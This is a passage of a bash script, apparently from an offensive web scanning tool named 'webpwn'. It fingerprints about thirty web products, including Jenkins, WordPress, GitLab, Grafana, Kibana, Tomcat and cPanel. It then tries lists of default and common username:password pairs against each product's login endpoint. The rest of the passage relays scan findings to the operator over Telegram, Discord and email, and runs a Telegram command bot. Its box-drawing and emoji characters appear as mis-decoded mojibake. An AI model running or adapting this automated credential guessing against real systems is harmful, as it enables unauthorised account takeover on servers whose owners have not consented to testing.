    # â”€â”€ DVWA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "damn vulnerable web application|dvwa"; then
        _detect_try "DVWA" "/login.php" "username" "password" \
            "admin:password" "admin:admin" "admin:abc123" \
            "user:user" "gordonb:abc123" "1337:charley" "pablo:letmein" && return 0
    fi

    # â”€â”€ OWASP Juice Shop â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "owasp juice shop|juice.?shop"; then
        _detect_try "Juice Shop" "/rest/user/login" "email" "password" \
            "admin@juice-sh.op:admin123" \
            "admin@juice-sh.op:admin" \
            "jim@juice-sh.op:ncc-1701" \
            "bjoern@juice-sh.op:kitten hood" && return 0
    fi

    # â”€â”€ WebGoat â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "webgoat"; then
        _detect_try "WebGoat" "/WebGoat/login" "username" "password" \
            "guest:guest" "admin:admin" "webgoat:webgoat" \
            "user:user" "test:test" && return 0
    fi

    # â”€â”€ Mutillidae â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "mutillidae|nowasp"; then
        _detect_try "Mutillidae" "/index.php?page=login.php" "username" "password" \
            "admin:adminpass" "admin:admin" "anonymous:anonymous" \
            "jeremy:jeremy" "samurai:samurai" && return 0
    fi

    # â”€â”€ Jenkins â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "jenkins"; then
        # Jenkins 2.x+ uses initial admin password from file; also try common ones
        _detect_try "Jenkins" "/j_spring_security_check" "j_username" "j_password" \
            "admin:admin" "admin:password" "jenkins:jenkins" \
            "admin:jenkins" "admin:123456" "root:password" && return 0
    fi

    # â”€â”€ WordPress â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "wordpress|wp-login"; then
        _detect_try "WordPress" "/wp-login.php" "log" "pwd" \
            "admin:admin" "admin:password" "admin:admin123" \
            "admin:wordpress" "admin:123456" "admin:letmein" \
            "wordpress:wordpress" "user:password" && return 0
    fi

    # â”€â”€ Joomla â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "joomla"; then
        _detect_try "Joomla" "/administrator/index.php" "username" "passwd" \
            "admin:admin" "admin:password" "admin:joomla" \
            "admin:admin123" "administrator:administrator" && return 0
    fi

    # â”€â”€ Drupal â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "drupal"; then
        _detect_try "Drupal" "/user/login" "name" "pass" \
            "admin:admin" "admin:password" "admin:drupal" \
            "drupal:drupal" "root:root" && return 0
    fi

    # â”€â”€ GitLab â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "gitlab"; then
        _detect_try "GitLab" "/users/sign_in" "user[login]" "user[password]" \
            "root:5iveL!fe" "root:password" "root:root" \
            "root:gitlab" "root:12345678" "admin:admin" && return 0
    fi

    # â”€â”€ Grafana â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "grafana"; then
        _detect_try "Grafana" "/login" "user" "password" \
            "admin:admin" "admin:password" "admin:grafana" \
            "admin:secret" "grafana:grafana" && return 0
    fi

    # â”€â”€ SonarQube â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "sonarqube|sonar"; then
        _detect_try "SonarQube" "/api/authentication/login" "login" "password" \
            "admin:admin" "admin:sonar" "sonar:sonar" && return 0
    fi

    # â”€â”€ phpMyAdmin â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "phpmyadmin"; then
        _detect_try "phpMyAdmin" "/index.php" "pma_username" "pma_password" \
            "root:" "root:root" "root:toor" "root:password" \
            "admin:admin" "pma:pma" && return 0
    fi

    # â”€â”€ Kibana â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "kibana"; then
        _detect_try "Kibana" "/login" "username" "password" \
            "elastic:changeme" "elastic:elastic" "admin:admin" \
            "kibana:kibana" "kibana_system:changeme" && return 0
    fi

    # â”€â”€ MinIO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "minio|min\.io"; then
        _detect_try "MinIO" "/minio/login" "accessKey" "secretKey" \
            "minioadmin:minioadmin" "minio:minio123" \
            "admin:admin123" "access:secret" && return 0
    fi

    # â”€â”€ Portainer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "portainer"; then
        _detect_try "Portainer" "/api/auth" "username" "password" \
            "admin:admin" "admin:portainer" "admin:password" \
            "admin:adminadmin" && return 0
    fi

    # â”€â”€ Nexus Repository â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "nexus repository|sonatype nexus"; then
        _detect_try "Nexus" "/service/rest/v1/security/users" "username" "password" \
            "admin:admin123" "admin:admin" "nexus:nexus" && return 0
    fi

    # â”€â”€ JFrog Artifactory â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "artifactory|jfrog"; then
        _detect_try "Artifactory" "/ui/login" "user" "password" \
            "admin:password" "admin:admin" "artifactory:password" && return 0
    fi

    # â”€â”€ Rancher â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "rancher"; then
        _detect_try "Rancher" "/v3-public/localProviders/local?action=login" "username" "password" \
            "admin:admin" "admin:password" "rancher:rancher" && return 0
    fi

    # â”€â”€ Keycloak â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "keycloak"; then
        _detect_try "Keycloak" "/auth/realms/master/protocol/openid-connect/token" "username" "password" \
            "admin:admin" "admin:password" "keycloak:keycloak" && return 0
    fi

    # â”€â”€ RabbitMQ Management â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "rabbitmq"; then
        _try_basic_auth "RabbitMQ" "${base_url}/api/whoami" \
            "guest:guest" "admin:admin" "rabbitmq:rabbitmq" \
            "admin:password" "user:user" && return 0
    fi

    # â”€â”€ Consul â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "consul"; then
        _try_basic_auth "Consul" "${base_url}/ui/dc1/services" \
            "admin:admin" "consul:consul" && return 0
    fi

    # â”€â”€ AWX / Ansible Tower â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "ansible tower|awx"; then
        _detect_try "AWX" "/api/v2/tokens/" "username" "password" \
            "admin:password" "admin:admin" "awx:awx" && return 0
    fi

    # â”€â”€ Nagios â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "nagios"; then
        _try_basic_auth "Nagios" "${base_url}/nagios/" \
            "nagiosadmin:nagiosadmin" "nagios:nagios" \
            "admin:admin" "nagiosadmin:password" && return 0
    fi

    # â”€â”€ Zabbix â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "zabbix"; then
        _detect_try "Zabbix" "/zabbix/index.php" "name" "password" \
            "Admin:zabbix" "admin:zabbix" "admin:admin" \
            "zabbix:zabbix" "guest:" && return 0
    fi

    # â”€â”€ OpenVPN Access Server â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "openvpn access server|openvpn-as"; then
        _detect_try "OpenVPN-AS" "/rest/GetSession" "username" "password" \
            "openvpn:openvpn" "admin:admin" "admin:password" && return 0
    fi

    # â”€â”€ cPanel / WHM â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "cpanel|whm"; then
        _detect_try "cPanel" "/login/?login_only=1" "user" "pass" \
            "root:root" "admin:admin" "cpanel:cpanel" \
            "admin:password" "root:password" && return 0
    fi

    # â”€â”€ Harbor (Container Registry) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "harbor"; then
        _detect_try "Harbor" "/c/login" "principal" "password" \
            "admin:Harbor12345" "admin:admin" "admin:password" && return 0
    fi

    # â”€â”€ Rundeck â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "rundeck"; then
        _detect_try "Rundeck" "/j_security_check" "j_username" "j_password" \
            "admin:admin" "admin:password" "rundeck:admin" && return 0
    fi

    # â”€â”€ Gitea â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "gitea|gogs"; then
        _detect_try "Gitea" "/user/login" "user_name" "password" \
            "gitea:gitea" "admin:admin" "admin:password" \
            "gogs:gogs" "root:root" && return 0
    fi

    # â”€â”€ TeamCity â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "teamcity"; then
        _detect_try "TeamCity" "/login.html" "username" "password" \
            "admin:admin" "teamcity:teamcity" "admin:password" && return 0
    fi

    # â”€â”€ Confluence â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "confluence"; then
        _detect_try "Confluence" "/dologin.action" "os_username" "os_password" \
            "admin:admin" "admin:confluence" "confluence:confluence" && return 0
    fi

    # â”€â”€ Jira â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "jira"; then
        _detect_try "Jira" "/login.jsp" "os_username" "os_password" \
            "admin:admin" "jira:jira" "admin:password" && return 0
    fi

    # â”€â”€ Apache Tomcat Manager â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "tomcat|apache tomcat"; then
        _try_basic_auth "Tomcat" "${base_url}/manager/html" \
            "admin:admin" "tomcat:tomcat" "admin:tomcat" \
            "tomcat:s3cret" "admin:s3cret" "manager:manager" \
            "role1:role1" "both:tomcat" && return 0
    fi

    # â”€â”€ Prometheus / Alertmanager â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    if echo "$httpx_data" | grep -qiE "prometheus|alertmanager"; then
        _try_basic_auth "Prometheus" "${base_url}/-/healthy" \
            "admin:admin" "prometheus:prometheus" && return 0
    fi

    log_info "  No default credentials matched â€” trying custom wordlist on common login paths..."

    # Generic fallback: try target-specific wordlist on common login paths
    if [[ -s "$custom_wl" ]]; then
        local generic_paths=("/login" "/login.php" "/login.html" "/admin" "/admin/login"
                             "/wp-login.php" "/user/login" "/signin" "/auth/login")
        for lpath in "${generic_paths[@]}"; do
            local test_url="${base_url}${lpath}"
            local http_code; http_code=$(curl -s -o /dev/null -w "%{http_code}" \
                --connect-timeout 5 --max-time 8 "$test_url" 2>/dev/null)
            if [[ "$http_code" =~ ^(200|302|301|403)$ ]]; then
                log_info "  Found login-like path: ${lpath} (${http_code}) â€” skipping generic brute (use --auth-user/pass)"
            fi
        done
    fi

    log_info "  No default credentials matched â€” continuing unauthenticated"
}

# â”€â”€â”€ Notification System â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

load_notify_config() {
    local conf_path="$NOTIFY_CONF"
    [[ ! -f "$conf_path" && -f "$LEGACY_NOTIFY_CONF" ]] && conf_path="$LEGACY_NOTIFY_CONF"
    [[ -f "$conf_path" ]] || return 0
    # shellcheck disable=SC1090
    while IFS='=' read -r key val; do
        [[ "$key" =~ ^# ]] && continue
        [[ -z "$key" ]] && continue
        val="${val//\"/}"
        case "$key" in
            TELEGRAM_BOT_TOKEN) [[ -z "$TELEGRAM_BOT_TOKEN" ]] && TELEGRAM_BOT_TOKEN="$val" ;;
            TELEGRAM_CHAT_ID)   [[ -z "$TELEGRAM_CHAT_ID"   ]] && TELEGRAM_CHAT_ID="$val" ;;
            DISCORD_WEBHOOK_URL) [[ -z "$DISCORD_WEBHOOK_URL" ]] && DISCORD_WEBHOOK_URL="$val" ;;
            NOTIFY_EMAIL_TO)    [[ -z "$NOTIFY_EMAIL_TO"    ]] && NOTIFY_EMAIL_TO="$val" ;;
            SMTP_HOST)          [[ -z "$SMTP_HOST" || "$SMTP_HOST" == "smtp.gmail.com" ]] && SMTP_HOST="$val" ;;
            SMTP_PORT)          SMTP_PORT="$val" ;;
            SMTP_USER)          [[ -z "$SMTP_USER" ]] && SMTP_USER="$val" ;;
            SMTP_PASS)          [[ -z "$SMTP_PASS" ]] && SMTP_PASS="$val" ;;
        esac
    done < "$conf_path"
}

notify_tg() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && return 0
    local msg="$1"
    local resp; resp=$(curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        --data-urlencode "text=${msg}" \
        -d "parse_mode=Markdown" \
        --connect-timeout 10 --max-time 15 2>/dev/null || echo "")
    # Persistently track sent message_id so /clear can delete it across sessions
    local mid; mid=$(echo "$resp" | python3 -c "
import sys,json
try: print(json.load(sys.stdin)['result']['message_id'])
except: pass" 2>/dev/null || echo "")
    if [[ -n "$mid" ]]; then
        mkdir -p "$(dirname "$TG_MSG_ID_FILE")"
        [[ -f "$TG_MSG_ID_FILE_LEGACY" && ! -f "$TG_MSG_ID_FILE" ]] && \
            cp "$TG_MSG_ID_FILE_LEGACY" "$TG_MSG_ID_FILE" 2>/dev/null || true
        echo "$mid" >> "$TG_MSG_ID_FILE"
    fi
}

# Delete a single Telegram message by ID (silently â€” fails ok for user messages)
tg_delete_msg() {
    local mid="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/deleteMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "message_id=${mid}" \
        --connect-timeout 5 --max-time 8 \
        -o /dev/null 2>/dev/null || true
}

# Delete all bot messages: tracked ones + range-sweep around the /clear trigger
# ref_msg_id = the message_id of the user's /clear command (used as range anchor)
tg_clear_chat() {
    local ref_msg_id="${1:-0}"

    # Run everything in background so the bot stays responsive immediately
    (
        # 1 â€” Delete all tracked message IDs from persistent file
        for _msg_file in "$TG_MSG_ID_FILE" "$TG_MSG_ID_FILE_LEGACY"; do
            [[ -f "$_msg_file" ]] || continue
            while IFS= read -r mid; do
                [[ -z "$mid" ]] && continue
                tg_delete_msg "$mid"
            done < "$_msg_file"
            rm -f "$_msg_file"
        done

        # 2 â€” Range sweep: try deleting up to 300 messages before the /clear command.
        #     Covers untracked messages (pre-bot, curl tests, earlier sessions).
        #     Failures are silent â€” Telegram rejects anything the bot didn't send.
        if [[ "$ref_msg_id" -gt 0 ]]; then
            local start=$(( ref_msg_id - 300 ))
            [[ "$start" -lt 1 ]] && start=1
            for (( mid=start; mid<=ref_msg_id; mid++ )); do
                tg_delete_msg "$mid"
            done
        fi
    ) &
}

notify_discord() {
    [[ -z "$DISCORD_WEBHOOK_URL" ]] && return 0
    local msg="$1"
    curl -s -X POST "$DISCORD_WEBHOOK_URL" \
        -H "Content-Type: application/json" \
        -d "{\"content\": $(python3 -c "import json,sys; print(json.dumps(sys.argv[1]))" "$msg" 2>/dev/null || echo "\"${msg}\"")}" \
        --connect-timeout 10 --max-time 15 \
        -o /dev/null 2>/dev/null || true
}

notify_email() {
    [[ -z "$NOTIFY_EMAIL_TO" || -z "$SMTP_USER" || -z "$SMTP_PASS" ]] && return 0
    local subject="$1" body="$2"
    curl -s "smtps://${SMTP_HOST}:465" \
        --ssl-reqd \
        --mail-from "$SMTP_USER" \
        --mail-rcpt "$NOTIFY_EMAIL_TO" \
        --user "${SMTP_USER}:${SMTP_PASS}" \
        -T <(printf "From: webpwn <%s>\nTo: %s\nSubject: %s\n\n%s\n" \
            "$SMTP_USER" "$NOTIFY_EMAIL_TO" "$subject" "$body") \
        --connect-timeout 15 --max-time 30 \
        -o /dev/null 2>/dev/null || true
}

# Send to all configured channels
notify_all() {
    local msg="$1"
    notify_tg "$msg"
    notify_discord "$msg"
    # Email only for critical/final events (subject extracted from first line)
    local subj; subj=$(echo "$msg" | head -1 | cut -c1-80)
    notify_email "[webpwn] ${subj}" "$msg"
}

# Poll Telegram for commands during scan (non-blocking, runs in background between phases)
tg_poll_commands() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && return 0

    local updates; updates=$(curl -s \
        "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=$((TG_LAST_UPDATE_ID+1))&timeout=1&limit=10" \
        --connect-timeout 8 --max-time 12 2>/dev/null || echo "")

    [[ -z "$updates" ]] && return 0

    # Parse updates with python3
    local cmds; cmds=$(python3 -c "
import sys, json
try:
    data = json.loads(sys.argv[1])
    for upd in data.get('result', []):
        uid = upd.get('update_id', 0)
        msg = upd.get('message', {})
        chat_id = str(msg.get('chat', {}).get('id', ''))
        text = msg.get('text', '').strip()
        if text:
            print(f'{uid}|{chat_id}|{text}')
except Exception as e:
    pass
" "$updates" 2>/dev/null || echo "")

    [[ -z "$cmds" ]] && return 0

    while IFS='|' read -r update_id chat_id text; do
        [[ -z "$update_id" ]] && continue
        TG_LAST_UPDATE_ID="$update_id"

        # Only respond to our own chat ID
        [[ "$chat_id" != "$TELEGRAM_CHAT_ID" ]] && continue

        case "${text,,}" in
            /status|status)
                notify_tg "ðŸ“Š *Scan Status*
Target: \`${TARGET}\`
Phase: ${CURRENT_PHASE:-starting}
Output: \`${OUTDIR}\`
Running since: $(date -d "@${START_TIME}" '+%H:%M:%S' 2>/dev/null || date -r "$START_TIME" '+%H:%M:%S' 2>/dev/null || echo 'N/A')"
                ;;
            /findings|findings)
                local n_total; n_total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
                local n_crit; n_crit=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
                local n_xss; n_xss=$(wc -l < "$VULN_DIR/xss/dalfox_findings.txt" 2>/dev/null || echo 0)
                notify_tg "ðŸ” *Current Findings*
Nuclei total: ${n_total}
Critical/High: ${n_crit}
XSS: ${n_xss}
Auth: ${AUTH_MODE}"
                ;;
            /stop|stop)
                notify_tg "ðŸ›‘ Stop requested. Finishing current phase then exiting..."
                TG_STOP_REQUESTED=true
                ;;
            /report|report)
                if [[ -f "${REPORT_DIR}/summary.md" ]]; then
                    local snippet; snippet=$(head -40 "${REPORT_DIR}/summary.md" 2>/dev/null | tr '|' ' ')
                    notify_tg "ðŸ“„ *Report snippet:*\n\`\`\`\n${snippet}\n\`\`\`"
                else
                    notify_tg "â³ Report not generated yet. Scan still running."
                fi
                ;;
            /help|help)
                notify_tg "ðŸ¤– *webpwn bot commands:*
/status â€” current phase & target
/findings â€” finding counts so far
/report â€” report snippet
/stop â€” stop after current phase
/clear â€” delete bot messages
/help â€” this message"
                ;;
            /clear)
                tg_clear_chat
                notify_tg "ðŸ§¹ Chat cleared."
                ;;
            /start)
                notify_tg "ðŸ‘‹ Scan in progress on \`${TARGET}\`. Send /status for details."
                ;;
        esac
    done <<< "$cmds"
}

# Standalone Telegram bot listener (--bot-listen mode)
# Accepts /scan <domain> commands from Telegram
tg_bot_listen() {
    [[ -z "$TELEGRAM_BOT_TOKEN" || -z "$TELEGRAM_CHAT_ID" ]] && {
        log_error "Bot listen mode requires --tg-token and --tg-chat (or notify.conf)"
        exit 1
    }
    log_phase "Telegram Bot Listener"
